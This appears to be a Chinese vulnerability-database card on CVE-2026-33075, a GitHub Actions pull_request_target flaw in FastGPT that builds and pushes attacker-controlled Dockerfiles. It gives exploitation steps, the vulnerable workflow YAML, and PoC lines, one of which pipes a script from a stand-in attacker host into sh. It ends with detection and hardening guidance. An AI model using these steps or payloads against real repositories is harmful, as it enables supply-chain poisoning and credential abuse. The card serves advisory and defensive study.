---
id: cloud-cicd-github-actions-pull-request-target-checkout-rce
title: CVE-2026-33075 FastGPT：pull_request_target 检出外部 PR 代码并用攻击者 Dockerfile 构建推镜像
type: scenario
domain: cloud
path: cloud/ci-cd
technique: github-actions-pr-target-checkout-dockerfile-rce
tags:
- github-actions
- ci-cd
- supply-chain
- pull-request-target
- dockerfile
- secret-exfiltration
- container-registry
- cve-2026-33075
cve:
- CVE-2026-33075
severity: critical
confidence: high
status: verified
affected_versions: FastGPT <= 4.14.8.3（CVE 描述）；原文影响版本行写 <= 4.14.8.4，并称发布时无补丁
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:23:14+08:00'
  notes: 已对照原文与17张截图核对：pull_request_target、packages/id-token/attestations/pull-requests 权限、checkout head.repo/head.ref、阿里云镜像仓库 login、buildx --push 与矩阵 Dockerfile 选择均一致；RUN env && exit 97 在 Actions 日志中执行证据成立，curl 因 alpine 镜像无 curl 失败亦与原文一致。卡片已注明 Dockerfile RUN 未直接读取阿里云 secret、secrets 明文窃取属 CVE 描述层面的能力，边界表述准确。受影响版本为原文影响版本行 <= 4.14.8.4 与 CVE 记录 <= 4.14.8.3 的差异，卡片已同时标注，未猜测修复版本。
url: /docs/cloud/ci-cd/cloud-cicd-github-actions-pull-request-target-checkout-rce/
draft: false
kb_aliases:
- CVE-2026-33075
- FastGPT GitHub Actions RCE
- pull_request_target 供应链投毒
- pwn request
- 外部 PR 窃取 secrets
- 攻击者 Dockerfile 构建镜像
---

## 一句话结论

FastGPT 的 `fastgpt-preview-image.yml` 使用 `pull_request_target`（在基仓库上下文运行、可访问 secrets 与写权限），却用 `actions/checkout` 把 `github.event.pull_request.head.repo.full_name` / `head.ref` 指向外部 fork 的代码拉进工作目录，随后直接构建并推送该代码中的 `Dockerfile`；外部贡献者只需提交一个修改过 Dockerfile 的 PR，就能在构建阶段执行任意命令，并把被篡改的镜像推到生产容器仓库，形成供应链投毒。

## 原理

- **触发上下文**：`pull_request_target` 在**基仓库**上下文中运行，默认可访问基仓库 secrets 和较高权限的 `GITHUB_TOKEN`；普通 `pull_request` 来自 fork 时默认只读、不给 secrets。二者混用是此类“pwn request”的根因。
- **权限过大**：工作流声明 `contents: read`、`packages: write`、`attestations: write`、`id-token: write`、`pull-requests: write`，说明它不是只读测试，而是可以登录/推送镜像、签发 OIDC 令牌、写 PR。
- **检出外部代码**：`actions/checkout@v3` 的 `with.ref` 为 `${{ github.event.pull_request.head.ref }}`、`with.repository` 为 `${{ github.event.pull_request.head.repo.full_name }}`，即拉取 PR 作者 fork 的分支；后续读取 `Dockerfile`、安装依赖、`docker buildx build` 全部基于这份不可信代码。
- **凭据用于推送**：`docker/login-action@v3` 使用 `secrets.ALI_HUB_USERNAME`、`secrets.ALI_HUB_PASSWORD` 登录阿里云容器镜像仓库；构建步骤把镜像 tag 设为 `${ALI_IMAGE_NAME}/fastgpt-pr:fatsgpt_${github.event.pull_request.head.sha}` 并 `--push`。
- **执行点**：构建矩阵从 `fastgpt`、`sandbox`、`mcp_server` 中选择 `projects/app/Dockerfile`、`projects/sandbox/Dockerfile`、`projects/mcp_server/Dockerfile`。攻击者在自己的 fork 中给 Dockerfile 加 `RUN env && exit 97`，构建时该命令在构建容器内执行，输出进入 Actions 日志；`exit 97` 只是让构建失败以便观察，真实攻击可换成下载执行、外传或篡改构建产物。
- **供应链后果**：工作流替攻击者完成构建并使用仓库凭据推送到生产镜像仓库；即使攻击者读不到 secret 明文，攻击者控制的 Dockerfile 已进入官方命名空间下的镜像，下游拉取即受影响。
- **权限边界**：Dockerfile 的 `RUN` 运行在构建容器内，能访问构建上下文和网络；GitHub secrets 是否可直接读取取决于是否被传入 build-args/环境。原文的 `RUN env` 只显示了 OTEL 等构建环境变量，未直接打印阿里云 secret；但 CVE 描述与工作流权限表明该上下文具备 secrets 访问与镜像推送能力，危害成立。

## 触发条件

- FastGPT 版本在受影响区间（原文环境 4.14.8.3；CVE 描述为 4.14.8.3 及以下）。
- 仓库启用 `.github/workflows/fastgpt-preview-image.yml`，且触发事件包含 `pull_request_target`。
- 工作流用 `github.event.pull_request.head.*` 检出外部 fork 代码，并在同一 job 内登录镜像仓库、构建、推送。
- 攻击者能 fork 仓库并向基仓库提交 PR；首次贡献者可能需要维护者批准工作流（原文复现中出现“workflow awaiting approval”，但批准后即执行）。
- 构建矩阵选择的 `Dockerfile` 位于攻击者可修改的代码路径中。

## 利用步骤

1. 准备两个 GitHub 账号 A（模拟受害仓库，配置 `ALI_HUB_USERNAME`、`ALI_HUB_PASSWORD`、`ALI_IMAGE_NAME` secrets）和 B（攻击者）。
2. B fork A 的仓库。
3. 在 B 的 fork 中修改 `projects/app/Dockerfile`，插入 `RUN env && exit 97` 验证命令执行；或插入 `RUN curl -s http://attacker/s.sh | sh` 下载执行（原文环境 node:20-alpine 无 curl，需换 wget 或自带二进制）。
4. B 向 A 提交 PR，触发 `pull_request_target` 工作流。
5. 工作流检出 B 的代码、用 A 的 secrets 登录镜像仓库、构建并推送 B 控制的 Dockerfile；构建日志中出现 `RUN env` 的输出，证明命令执行。
6. 若构建成功，镜像会以 `fastgpt-pr:fatsgpt_<PR sha>` 的 tag 推到 A 的镜像仓库；攻击者可通过修改 Dockerfile 在镜像中植入后门、窃取构建上下文中的文件或外连。
7. 检查 Actions 日志中的 `#10 [maindeps 3/11] RUN ...` 行与退出码，确认执行。

## PoC

恶意 Dockerfile 片段（最小验证）：

```dockerfile
# 在 projects/app/Dockerfile 开头插入
RUN env && exit 97
```

或下载执行（需目标基础镜像有 curl/wget）：

```dockerfile
RUN curl -s http://attacker.example/s.sh | sh && exit 99
```

关键工作流片段（原文）：

```yaml
on:
  pull_request_target:
  workflow_dispatch:

jobs:
  preview-fastgpt-images:
    permissions:
      contents: read
      packages: write
      attestations: write
      id-token: write
      pull-requests: write
    steps:
      - name: Checkout
        uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Login to Aliyun Container Registry
        uses: docker/login-action@v3
        with:
          registry: registry.cn-hangzhou.aliyuncs.com
          username: ${{ secrets.ALI_HUB_USERNAME }}
          password: ${{ secrets.ALI_HUB_PASSWORD }}

      - name: Build ${{ matrix.image }} image for PR
        run: |
          docker buildx build \
            -f ${{ steps.config.outputs.DOCKERFILE }} \
            -t ${{ steps.config.outputs.DOCKER_REPO_TAGGED }} \
            --push \
            .
```

提交 PR 后，Actions 日志出现：

```text
#10 [maindeps 3/11] RUN env && exit 97
#10 ERROR: process "/bin/sh -c env && exit 97" did not complete successfully: exit code: 97
```

说明攻击者 Dockerfile 中的命令已在构建环境执行。

## 变体与关联

- 把 `RUN` 换成 `COPY`/`RUN` 组合篡改应用二进制、写入内存马、修改启动脚本，构建出的镜像即为后门镜像。
- 若构建参数传入 secrets（`build-args`），可直接 `RUN echo $SECRET` 或外传；即使没有 build-args，构建上下文也可能包含工作流 checkout 的文件。
- 同类 pwn request 还常见于 `issue_comment`、`workflow_run`、`pull_request_review` 等事件；只要在特权上下文 checkout/执行外部代码，原理相同。
- 关联：[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（同为构建/安装链投毒，但入口是依赖生命周期脚本）。
- 关联：[[cloud-cicd-java-annotation-processor-filer-backdoor-injection]]（同为构建产物被植入后门，但入口是注解处理器）。

## 检测与防御

- **检测**：审计工作流中同时出现 `pull_request_target` 与 `actions/checkout` 的 `github.event.pull_request.head.*`；检查是否在同一 job 内登录镜像仓库、推送镜像；检查 `permissions` 是否包含 `packages: write`、`id-token: write`、`attestations: write` 等非必要权限。
- **检测**：Actions 日志出现异常 `RUN` 命令、构建上下文外连、构建镜像 tag 含 PR sha 且被推送到生产命名空间；监控镜像仓库中来源异常的 `fastgpt-pr` 镜像。
- **修复**：不要在 `pull_request_target` 中 checkout 并执行外部 PR 代码；PR 构建校验改用 `pull_request` 触发并限制只读权限；把登录仓库、推送镜像、更新 K8s 等需要 secrets 的动作从 PR 触发链拆出；删除不必要的 `packages: write`、`id-token: write`、`attestations: write`。
- **加固**：对外部 fork 的工作流强制人工批准；固定 action 版本/commit；使用最小权限 `GITHUB_TOKEN`；在隔离的临时仓库/环境中构建 PR 预览镜像，不推送到生产仓库；用 CodeQL 或 actionlint 扫描工作流。
